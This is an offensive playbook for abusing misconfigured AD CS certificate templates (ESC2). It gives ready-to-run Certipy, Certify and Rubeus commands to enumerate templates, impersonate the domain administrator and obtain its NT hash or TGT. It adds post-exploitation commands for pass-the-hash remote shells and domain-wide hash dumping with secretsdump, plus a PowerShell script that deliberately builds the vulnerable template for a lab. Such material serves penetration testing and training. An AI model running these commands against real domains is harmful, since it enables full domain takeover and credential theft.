# ESC2 — Any Purpose / No EKU Certificate Template Abuse

---

## ESC2 Condition

```
Any Purpose EKU or No EKU    -    Template has OID 2.5.29.37.0 (Any Purpose) or pKIExtendedKeyUsage is empty
Broad enrollment permit       -    Domain Users, Authenticated Users, or other large groups can enroll
Manager approval not required -    Certificate is issued automatically without approval
Subordinate CA abuse          -    Certificate can be used to sign other certificates (acts like a sub-CA)
```

---

## ESC2 Flags

```powershell
pKIExtendedKeyUsage      -    2.5.29.37.0 (Any Purpose)  OR  empty/null
msPKI-Enrollment-Flag    -    0x0                              # No manager approval
msPKI-RA-Signature       -    0                               # No authorized signature required
```

> **Key difference from ESC1:** ESC2 does NOT require `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.
> Even without SAN control, the "Any Purpose" EKU lets the certificate be used for
> client authentication, code signing, server auth, and more — including acting as a sub-CA.

---

## ESC2 Enumeration

```powershell
# Certipy
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

# Certify.exe
Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

---

## ESC2 Enumeration With LDAP

```powershell
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name pKIExtendedKeyUsage msPKI-Enrollment-Flag msPKI-RA-Signature

# Any Purpose OID to look for:
# 2.5.29.37.0  → Any Purpose
# empty        → No EKU (even more permissive)
```

---

## ESC2 Exploitation — Path 1: Direct Auth (if SAN is enrollee-supplied)

If the template ALSO has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, exploit exactly like ESC1:

```powershell
# Request certificate with admin UPN
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC2' \
    -upn 'administrator@certificate.local' \
    -ldap-scheme ldap

# Authenticate and get NT Hash
certipy-ad auth \
    -pfx administrator.pfx \
    -dc-ip 192.168.0.150
```

---

## ESC2 Exploitation — Path 2: Sub-CA Abuse (No SAN control needed)

When `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is NOT set, use the certificate as a
subordinate CA to issue a certificate for any user:

```powershell
# Step 1 — Request the Any Purpose / No EKU certificate as yourself
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC2' \
    -ldap-scheme ldap

# Output: test.pfx

# Step 2 — Use that certificate to request another cert on behalf of Domain Admin
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'User' \
    -on-behalf-of 'certificate\administrator' \
    -pfx test.pfx \
    -ldap-scheme ldap

# Output: administrator.pfx

# Step 3 — Authenticate with the forged certificate
certipy-ad auth \
    -pfx administrator.pfx \
    -dc-ip 192.168.0.150
```

---

## ESC2 Exploitation With Certify and Rubeus

```powershell
# Step 1 — Request Any Purpose cert
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnESC2"

# Convert PEM → PFX (Linux)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Step 2 — Use cert as sub-CA to request on behalf of admin
Certify.exe request /ca:"CA-Server\CA-Name" /template:"User" \
    /onbehalfof:"DOMAIN\administrator" \
    /enrollcert:cert.pfx /enrollcertpwd:''

# Convert new PEM → PFX
openssl pkcs12 -in admin_cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Step 3 — Get TGT
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:'' /ptt

# Verify
klist
whoami /all
```

---

## Post Exploitation

```powershell
# SMB with NT Hash
impacket-psexec  -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

---

## Laboratory

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC2 Vulnerable Lab Setup Script
    Creates a misconfigured AD CS certificate template for ESC2 testing.

.DESCRIPTION
    Sets up a template with Any Purpose EKU and no manager approval.
    Run as SYSTEM if Domain Admin is insufficient:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC2Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# ── Config ────────────────────────────────────────────────────────────────────

$TemplateName = "VulnESC2"
$TemplateOID  = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.200"
$EnrollGroup  = "Domain Users"

# ── Helpers ───────────────────────────────────────────────────────────────────

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

# ── Preflight ─────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ESC2 Lab Setup" -ForegroundColor Magenta
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# ── Cleanup existing ──────────────────────────────────────────────────────────

$existing = Get-ADObject -Filter { Name -eq "VulnESC2" } -SearchBase $templatePath -ErrorAction SilentlyContinue

if ($existing) {
    Write-Warn "Existing VulnESC2 template found. Removing..."
    try {
        certutil -SetCATemplates -VulnESC2 2>$null | Out-Null
    } catch {}
    try {
        Remove-ADObject "CN=VulnESC2,$templatePath" -Confirm:$false -ErrorAction Stop
        Write-Ok "Old template removed."
    } catch {
        Write-Fail "Could not remove old template: $_"
        Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC2Lab.ps1"
        exit 1
    }
}

# ── Create template ───────────────────────────────────────────────────────────

Write-Step "Creating vulnerable certificate template: $TemplateName"

$attrs = @{
    "displayName"                          = $TemplateName
    "msPKI-Cert-Template-OID"              = $TemplateOID
    "msPKI-Certificate-Name-Flag"          = 0          # No CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (key ESC2 difference)
    "msPKI-Enrollment-Flag"                = 0          # No manager approval
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16         # Exportable private key
    "msPKI-RA-Signature"                   = 0          # No authorized signature required
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "2.5.29.37.0"   # Any Purpose OID
    "pKIExtendedKeyUsage"                  = "2.5.29.37.0"   # Any Purpose OID
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x86, 0x00)   # DigitalSignature + KeyEncipherment + KeyCertSign
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)  # 1 year
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)  # 6 weeks
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $TemplateName `
                 -Path $templatePath `
                 -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrs `
                 -ErrorAction Stop
    Write-Ok "Template created successfully."
} catch {
    Write-Fail "Failed to create template: $_"
    Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC2Lab.ps1"
    exit 1
}

# ── Set ACL ───────────────────────────────────────────────────────────────────

Write-Step "Granting Enroll permission to '$EnrollGroup'..."

try {
    $acl  = Get-Acl "AD:\CN=$TemplateName,$templatePath"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.NTAccount]$EnrollGroup,
        "ExtendedRight",
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
    Write-Ok "Enroll permission granted to '$EnrollGroup'."
} catch {
    Write-Fail "Failed to set ACL: $_"
    exit 1
}

# ── Add to CA ─────────────────────────────────────────────────────────────────

Write-Step "Adding template to CA..."

$result = certutil -SetCATemplates +$TemplateName 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Ok "Template added to CA."
} else {
    Write-Warn "certutil -SetCATemplates failed, trying Add-CATemplate..."
    try {
        Add-CATemplate -Name $TemplateName -Force -ErrorAction Stop
        Write-Ok "Template added to CA via Add-CATemplate."
    } catch {
        Write-Fail "Could not add template to CA: $_"
        exit 1
    }
}

# ── Restart CertSvc ───────────────────────────────────────────────────────────

Write-Step "Restarting CertSvc..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 5
Write-Ok "CertSvc restarted."

# ── Summary ───────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  ESC2 Lab Ready" -ForegroundColor Green
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Template         : $TemplateName" -ForegroundColor White
Write-Host "  EKU              : Any Purpose (2.5.29.37.0)" -ForegroundColor White
Write-Host "  Enrollee SAN     : NOT required (sub-CA path)" -ForegroundColor White
Write-Host "  Manager Approval : Disabled" -ForegroundColor White
Write-Host "  RA Signature     : 0" -ForegroundColor White
Write-Host ""
Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
Write-Host ""

$domain = (Get-ADDomain).DNSRoot
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

Write-Host "  # Step 1 — Get Any Purpose cert as low-priv user" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 2 — Use cert to enroll on behalf of Domain Admin" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template 'User' \`" -ForegroundColor Cyan
Write-Host "      -on-behalf-of '$($domain.Split('.')[0])\administrator' \`" -ForegroundColor Cyan
Write-Host "      -pfx lowuser.pfx -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 3 — Authenticate" -ForegroundColor DarkGray
Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
```
